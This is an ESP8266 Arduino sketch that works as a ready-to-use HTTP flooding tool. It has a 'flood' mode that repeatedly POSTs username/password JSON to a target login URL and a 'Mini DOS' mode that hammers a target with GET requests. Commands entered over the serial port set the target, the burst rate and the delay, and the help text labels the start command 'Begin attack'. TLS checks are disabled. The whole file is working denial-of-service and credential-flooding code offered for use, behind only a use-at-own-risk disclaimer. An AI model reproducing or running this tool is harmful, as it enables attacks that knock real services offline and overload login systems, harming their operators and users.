#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif
const char* ssid = "SSID";
const char* wifiPassword = "PASSWORD";
String target_url = "";
bool floodActive = false;
int requestCount = 0;
unsigned long startMillis = 0;
unsigned long cooldownMillis = 0;
String floodUsername = "name";
String floodPassword = "pass";
int requestBurst = 10;
int requestDelay = 1;
int mode = 0;
void connectWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, wifiPassword);
  Serial.print("Connecting to WiFi");
  int timeout = 20;
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(500);
    Serial.print(".");
    timeout--;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected!");
    Serial.print("Device IP: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\nWiFi connection failed.");
  }
}
void sendFloodRequest() {
  if (WiFi.status() != WL_CONNECTED) { Serial.println("WiFi Disconnected!"); return; }
  if (target_url == "") { Serial.println("Target URL not set!"); return; }
  WiFiClientSecure client;
  HTTPClient http;
  client.setInsecure();
  http.begin(client, target_url);
  http.addHeader("Content-Type", "application/json");
  String payload = "{\"username\": \"" + floodUsername + "\", \"password\": \"" + floodPassword + "\"}";
  int payloadLength = payload.length();
  int httpResponseCode = http.POST(payload);
  if (httpResponseCode > 0) {
    String responseBody = http.getString();
    requestCount++;
    Serial.print("Flood Request: ");
    Serial.print(floodUsername);
    Serial.print(" / ");
    Serial.print(floodPassword);
    Serial.print(" | Payload: ");
    Serial.print(payloadLength);
    Serial.print(" bytes | HTTP Code: ");
    Serial.print(httpResponseCode);
    Serial.print(" | Response: ");
    Serial.println(responseBody);
  } else {
    Serial.println("Request Failed.");
  }
  http.end();
}
void sendMiniDOSRequest() {
  if (WiFi.status() != WL_CONNECTED) { Serial.println("WiFi Disconnected!"); return; }
  if (target_url == "") { Serial.println("Target URL/IP not set!"); return; }
  WiFiClientSecure client;
  HTTPClient http;
  client.setInsecure();
  http.begin(client, target_url);
  int httpResponseCode = http.GET();
  if (httpResponseCode > 0) {
    String responseBody = http.getString();
    requestCount++;
    Serial.print("Mini DOS Request | HTTP Code: ");
    Serial.print(httpResponseCode);
    Serial.print(" | Response: ");
    Serial.println(responseBody);
  } else {
    Serial.println("Request Failed.");
  }
  http.end();
}
void updateLED() {
  static unsigned long lastToggle = 0;
  static bool ledState = false;
  unsigned long currentMillis = millis();
  if (floodActive) {
    unsigned long elapsedFlood = currentMillis - startMillis;
    int blinkInterval = ((elapsedFlood % 10000) < 5000) ? 100 : 500;
    if (currentMillis - lastToggle >= blinkInterval) {
      lastToggle = currentMillis;
      ledState = !ledState;
      digitalWrite(LED_BUILTIN, ledState ? LOW : HIGH);
    }
  } else {
    digitalWrite(LED_BUILTIN, HIGH);
  }
}
void printFloodHelp() {
  Serial.println("Flood Mode Help:");
  Serial.println(" url <target_url>    : Set target URL");
  Serial.println(" user <username>     : Set username");
  Serial.println(" pass <password>     : Set password");
  Serial.println(" rate <number>       : Set requests per burst");
  Serial.println(" delay <ms>          : Set delay between requests");
  Serial.println(" mode flood          : Select Flood Mode");
  Serial.println(" start               : Begin attack");
  Serial.println(" stop                : Stop attack");
  Serial.println(" Developed by toxi360 - https://github.com/Efeckc17");
}
void printMiniDOSHelp() {
  Serial.println("Mini DOS Mode Help:");
  Serial.println(" url <target_url/IP> : Set target URL or IP");
  Serial.println(" rate <number>       : Set requests per burst");
  Serial.println(" delay <ms>          : Set delay between requests");
  Serial.println(" mode minidos        : Select Mini DOS Mode");
  Serial.println(" start               : Begin attack");
  Serial.println(" stop                : Stop attack");
  Serial.println(" Developed by toxi360 - https://github.com/Efeckc17");
}
void splashScreen() {
  Serial.println();
  Serial.println("🚨 WARNING: This software is provided as-is and is used at your own risk. 🚨");
  Serial.print("IP Address: ");
  Serial.println(WiFi.localIP());
  Serial.print("MAC Address: ");
  Serial.println(WiFi.macAddress());
  Serial.println("Type 'I accept' to continue...");
  while (true) {
    if (Serial.available() > 0) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.equalsIgnoreCase("I accept")) break;
      Serial.println("Please type 'I accept' to continue...");
    }
  }
  Serial.println("Thank you. Please select mode: type 'mode flood' or 'mode minidos'");
}
void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  connectWiFi();
  splashScreen();
}
void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command.startsWith("url ")) { target_url = command.substring(4); Serial.print("Target Set: "); Serial.println(target_url); }
    else if (command.startsWith("user ")) { floodUsername = command.substring(5); Serial.print("Username Set: "); Serial.println(floodUsername); }
    else if (command.startsWith("pass ")) { floodPassword = command.substring(5); Serial.println("Password Set."); }
    else if (command.startsWith("rate ")) { int newRate = command.substring(5).toInt(); if (newRate > 0) { requestBurst = newRate; Serial.print("Burst rate set to: "); Serial.println(requestBurst); } else { Serial.println("Invalid rate value."); } }
    else if (command.startsWith("delay ")) { int newDelay = command.substring(6).toInt(); if (newDelay >= 0) { requestDelay = newDelay; Serial.print("Delay set to: "); Serial.print(requestDelay); Serial.println(" ms"); } else { Serial.println("Invalid delay value."); } }
    else if (command.startsWith("mode ")) {
      String modeStr = command.substring(5);
      modeStr.trim();
      if (modeStr.equalsIgnoreCase("flood")) { mode = 1; Serial.println("Mode set to Flood Request Mode."); }
      else if (modeStr.equalsIgnoreCase("minidos")) { mode = 2; Serial.println("Mode set to Mini DOS Mode."); }
      else { Serial.println("Unknown mode. Options: flood, minidos."); }
    }
    else if (command.equalsIgnoreCase("help flood")) { printFloodHelp(); }
    else if (command.equalsIgnoreCase("help minidos")) { printMiniDOSHelp(); }
    else if (command == "start") {
      if (target_url == "") { Serial.println("Set target first: 'url <target>'"); }
      else if (mode == 0) { Serial.println("Select mode first: 'mode flood' or 'mode minidos'"); }
      else { floodActive = true; requestCount = 0; startMillis = millis(); cooldownMillis = 0; Serial.println("Attack Started."); }
    }
    else if (command == "stop") { floodActive = false; Serial.println("Attack Stopped."); }
    else { Serial.println("Unknown command. Type 'help flood' or 'help minidos' for a list of commands."); }
  }
  updateLED();
  if (floodActive) {
    if (millis() - cooldownMillis >= 10000) {
      if (requestCount >= 1000) { Serial.println("Device overheating. Cooling down for 5 seconds."); delay(5000); }
      requestCount = 0; cooldownMillis = millis();
    }
    for (int i = 0; i < requestBurst; i++) {
      if (mode == 1) sendFloodRequest();
      else if (mode == 2) sendMiniDOSRequest();
      delay(requestDelay);
    }
  }
}
